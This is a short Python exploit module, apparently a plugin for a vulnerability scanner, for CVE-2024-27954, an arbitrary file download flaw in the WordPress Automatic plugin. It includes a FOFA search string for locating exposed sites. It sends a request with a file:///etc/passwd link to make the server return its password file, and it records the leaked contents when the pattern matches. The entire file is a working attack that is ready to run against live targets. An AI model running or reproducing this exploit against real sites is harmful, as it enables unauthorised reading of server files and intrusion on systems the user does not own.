#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'WordPress Automatic 插件任意文件下载 CVE-2024-27954',

      'level'     :   'medium',

      'FOFA'      :   '"/wp-content/plugins/wp-automatic"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/11',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/?p=3232&wp_automatic=download&link=file:///etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret